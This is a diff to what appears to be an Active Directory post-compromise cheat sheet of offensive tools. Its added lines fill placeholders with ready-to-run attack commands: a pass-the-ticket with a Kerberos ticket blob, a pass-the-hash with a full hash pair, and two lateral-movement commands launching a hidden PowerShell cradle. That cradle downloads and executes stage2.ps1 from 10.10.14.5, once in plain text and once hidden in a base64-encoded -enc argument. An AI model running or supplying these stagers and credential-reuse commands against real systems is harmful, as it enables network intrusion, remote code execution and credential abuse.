@@ -259,7 +259,7 @@ SharpHound.exe -c All --zipfilename loot.zip
 # github.com/GhostPack/Rubeus
 Rubeus.exe kerberoast /outfile:hashes.txt
 Rubeus.exe asreproast /outfile:asrep.txt
-Rubeus.exe ptt /ticket:base64...
+Rubeus.exe ptt /ticket:doIFnjCCBZqgAwIBBaEDAgEWooIEmzCCBJdhggSTMIIEj6ADAgEFoRIbEENPUlAuSU5MQU5FRlJFRUS
 
 # StandIn — AD post-compromise toolkit (.NET):
 # github.com/FuzzySecurity/StandIn
@@ -407,8 +407,8 @@ ScheduleRunner.exe /method:create /taskname:Update /trigger:onlogon \
 # CrackMapExec — swiss army knife for network pentesting:
 # github.com/byt3bl33d3r/CrackMapExec
 cme smb 10.10.10.0/24 -u admin -p 'Pass123' --shares
-cme smb 10.10.10.5 -u admin -H 'aad3b435...:ntlmhash' -x whoami
-cme winrm 10.10.10.5 -u admin -p 'Pass123' -X "powershell -c ..."
+cme smb 10.10.10.5 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x whoami
+cme winrm 10.10.10.5 -u admin -p 'Pass123' -X "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"
 
 # impacket — Python protocol library for lateral movement:
 # github.com/SecureAuthCorp/impacket
@@ -419,7 +419,7 @@ secretsdump.py corp.local/admin:'Pass123'@dc01
 # SharpRDP — RDP execution via .NET:
 # github.com/0xthirteen/SharpRDP
 SharpRDP.exe computername=10.10.10.5 username=admin \
-  password=Pass123 command="powershell -enc ..."
+  password=Pass123 command="powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA="
 
 # SCShell — fileless lateral movement via ChangeServiceConfigA:
 # github.com/Mr-Un1k0d3r/SCShell
